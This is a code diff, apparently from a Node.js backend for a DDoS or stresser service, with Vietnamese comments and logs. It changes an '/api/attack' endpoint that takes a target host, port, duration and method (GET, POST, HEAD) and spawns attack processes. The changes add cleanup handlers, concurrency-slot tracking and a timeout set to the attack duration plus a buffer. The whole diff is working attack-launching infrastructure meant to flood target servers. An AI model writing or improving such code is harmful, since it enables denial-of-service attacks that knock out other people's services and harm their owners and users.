@@ -23,16 +23,31 @@ const validateInput = ({ key, host, time, method, port }) => {
 const executeAttack = (command) => {
   const childProcess = spawn(command.split(" ")[0], command.split(" ").slice(1), { stdio: "inherit" });
   currentPID = childProcess.pid;
+  console.log(`Tiến trình ${currentPID} đã được khởi chạy.`);
+
+  const cleanup = () => {
+    activeAttacks--, currentPID = null;
+    console.log(`Tiến trình ${childProcess.pid} đã kết thúc. Slot được giải phóng.`);
+  };
 
   childProcess.on("close", (code) => {
-    activeAttacks--, currentPID = null;
-    console.log(`Tiến trình ${currentPID} đã kết thúc với mã ${code}. Slot được giải phóng.`);
+    console.log(`Tiến trình ${childProcess.pid} đã đóng với mã ${code}.`);
+    cleanup();
   });
 
   childProcess.on("error", (err) => {
-    activeAttacks--, currentPID = null;
     console.error(`Lỗi khi thực thi lệnh: ${err.message}`);
+    cleanup();
   });
+
+  // Timeout để đảm bảo tiến trình không bị treo
+  setTimeout(() => {
+    if (currentPID === childProcess.pid) {
+      console.error(`Tiến trình ${childProcess.pid} bị treo và đã bị hủy.`);
+      childProcess.kill();
+      cleanup();
+    }
+  }, time * 1000 + 10000); // Thêm 10 giây buffer sau thời gian tấn công
 };
 
 const executeAllAttacks = (methods, host, time) => {
@@ -62,7 +77,7 @@ app.get("/api/attack", (req, res) => {
       host: host,
       port: port,
       time: time,
-      modul: "GET POST HEAD", // Hiển thị đầy đủ khi chọn FULL
+      modul: "GET POST HEAD",
       method: method,
       pid: currentPID,
     });
@@ -75,7 +90,7 @@ app.get("/api/attack", (req, res) => {
       host: host,
       port: port,
       time: time,
-      modul: modul, // Chỉ hiển thị giá trị của modul (GET, POST, hoặc HEAD)
+      modul: modul,
       method: method,
       pid: currentPID,
     });
